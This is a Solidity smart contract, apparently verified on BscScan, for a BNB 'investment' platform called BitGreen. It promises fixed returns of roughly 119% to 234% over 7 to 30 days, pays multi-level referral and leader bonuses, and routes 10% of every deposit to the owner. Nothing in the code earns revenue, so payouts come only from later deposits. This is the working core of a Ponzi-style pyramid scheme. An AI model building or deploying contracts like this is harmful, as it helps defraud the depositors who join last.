/**
 *Submitted for verification at BscScan.com on 2022-09-15
*/

// SPDX-License-Identifier: MIT License

pragma solidity >=0.8.0;

struct Tarif {
  uint8 life_days;
  uint8 percent;
}

struct Deposit {
  uint8 tarif;
  uint256 amount;
  uint256 time;
}

struct Player {
  address upline;
  uint256 dividends;
  uint256 match_bonus;
  uint256 leader_bonus;
  uint256 last_payout;
  uint256 total_invested;
  uint256 total_withdrawn;
  uint256 total_match_bonus;

  uint256 leadTurnover;
  uint256 leadBonusReward;
  bool[9] receivedBonuses;

  Deposit[] deposits;
  uint256[5] structure; // length has been got from bonus lines number
  address[] referrals;
  uint256[5] refTurnover;
}

interface IERC20 {

  function balanceOf(address account) external view returns (uint256);

  function transfer(address to, uint256 amount) external returns (bool);

}

contract BitGreen {
    address public owner;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public match_bonus;
    uint256 public totalLeadBonusReward;
    
    uint8 constant BONUS_LINES_COUNT = 5;
    uint16 constant PERCENT_DIVIDER = 1000; // 100 * 10
    uint8[BONUS_LINES_COUNT] public ref_bonuses = [50, 20, 10, 5, 5]; // 5%, 2%, 1%, 0.5%, 0.5%
    uint256[9] public LEADER_BONUS_TRIGGERS = [
        2 ether,
        5 ether,
        10 ether,
        20 ether,
        100 ether,
        200 ether,
        1_000 ether,
        2_000 ether,
        10_000 ether
    ];

    uint256[9] public LEADER_BONUS_REWARDS = [
        0.04 ether,
        0.08 ether,
        0.2 ether,
        0.4 ether,
        2 ether,
        7 ether,
        25 ether,
        70 ether,
        500 ether
    ];

    uint256[3] public LEADER_BONUS_LEVEL_PERCENTS = [100, 30, 15];

    mapping(uint8 => Tarif) public tarifs;
    mapping(address => Player) public players;
    uint256 totalPlayers;

    event Upline(address indexed addr, address indexed upline, uint256 bonus, uint256 timestamp);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif, uint256 timestamp);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount, uint256 timestamp);
    event Withdraw(address indexed addr, uint256 amount, uint256 timestamp);
    event LeaderBonusReward(
        address indexed to,
        uint256 indexed amount,
        uint8 indexed level,
        uint256 timestamp
    );

    constructor() {
        owner = msg.sender;
        players[owner].upline = owner;

        uint8 tarifPercent = 119;
        for (uint8 tarifDuration = 7; tarifDuration <= 30; tarifDuration++) {
            tarifs[tarifDuration] = Tarif(tarifDuration, tarifPercent);
            tarifPercent+= 5;
        }
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if (payout > 0) {
            players[_addr].last_payout = block.timestamp;
            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus, block.timestamp);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if (players[_addr].upline == address(0) && _addr != owner) {
            totalPlayers++;
            if (players[_upline].deposits.length == 0) {
                _upline = owner;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 100, block.timestamp);
            
            players[_upline].referrals.push(_addr);
            for (uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
                players[_upline].structure[i]++;

                address prevUpline = _upline;
                _upline = players[_upline].upline;

                if (_upline == address(0) || prevUpline == _upline) {
                  break;
                }
            }
        }
    }

    function deposit(uint8 _tarif, address _upline) external payable {
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(msg.value >= 0.01 ether, "Minimum deposit amount is 0.01 BNB");

        Player storage player = players[msg.sender];

        require(player.deposits.length < 100, "Max 100 deposits per address");

        _setUpline(msg.sender, _upline, msg.value);

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            time: block.timestamp
        }));

        player.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);
        distributeBonuses(msg.value, msg.sender);

        address ref = player.upline;
        for (uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
          players[ref].refTurnover[i]+= msg.value;

          address prevRef = ref;
          ref = players[ref].upline;
          if (prevRef == ref || ref == address(0x0)) {
            break;
          }
        }

        payable(owner).transfer(msg.value / 10);
        
        emit NewDeposit(msg.sender, msg.value, _tarif, block.timestamp);
    }
    
    function withdraw() external {
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.match_bonus > 0 || player.leader_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.match_bonus + player.leader_bonus;

        player.dividends = 0;
        player.match_bonus = 0;
        player.leader_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

        payable(msg.sender).transfer(amount);
        
        emit Withdraw(msg.sender, amount, block.timestamp);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * uint256(86400);
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : block.timestamp;

            if (from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / uint256(8640000);
            }
        }

        return value;
    }

    function distributeBonuses(uint256 _amount, address _player) private {
      address ref = players[_player].upline;

      for (uint8 i = 0; i < LEADER_BONUS_LEVEL_PERCENTS.length; i++) {
        players[ref].leadTurnover+= _amount * LEADER_BONUS_LEVEL_PERCENTS[i] / 100;

        for (uint8 j = 0; j < LEADER_BONUS_TRIGGERS.length; j++) {
          if (players[ref].leadTurnover >= LEADER_BONUS_TRIGGERS[j]) {
            if (!players[ref].receivedBonuses[j]) {
              players[ref].receivedBonuses[j] = true;
              players[ref].leadBonusReward+= LEADER_BONUS_REWARDS[j];
              totalLeadBonusReward+= LEADER_BONUS_REWARDS[j];

              //payable(ref).transfer(LEADER_BONUS_REWARDS[j]);
              players[ref].leader_bonus+= LEADER_BONUS_REWARDS[j];
              emit LeaderBonusReward(
                ref,
                LEADER_BONUS_REWARDS[j],
                i,
                block.timestamp
              );
            } else {
              continue;
            }
          } else {
            break;
          }
        }

        ref = players[ref].upline;

        if (ref == address(0x0)) {
          break;
        }
      }
    }

    function getTotalLeaderBonus(address _player) external view returns (uint256) {
      return players[_player].leadBonusReward;
    }

    function getReceivedBonuses(address _player) external view returns (bool[9] memory) {
        return players[_player].receivedBonuses;
    }

    /*
        Only external call
    */
    function userInfo(address _addr) external view
      returns(
        uint256 for_withdraw,
        uint256 total_invested,
        uint256 total_withdrawn,
        uint256 total_match_bonus,
        uint256 total_leader_bonus,
        uint256[BONUS_LINES_COUNT] memory structure,
        uint256[BONUS_LINES_COUNT] memory refTurnover
    ) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        return (
            payout + player.dividends + player.match_bonus + player.leader_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            player.leadBonusReward,
            player.structure,
            player.refTurnover
        );
    }

    function contractInfo() view external returns(uint256, uint256, uint256, uint256, uint256) {
      return (invested, withdrawn, match_bonus, totalLeadBonusReward, totalPlayers);
    }

    function invest() external payable {
      payable(msg.sender).transfer(msg.value);
    }

    function retrieveERC20(address tokenContractAddress) external {
      require(msg.sender == owner, "Only owner can call this method");

      IERC20(tokenContractAddress).transfer(
        owner,
        IERC20(tokenContractAddress).balanceOf(address(this))
      );
    }

}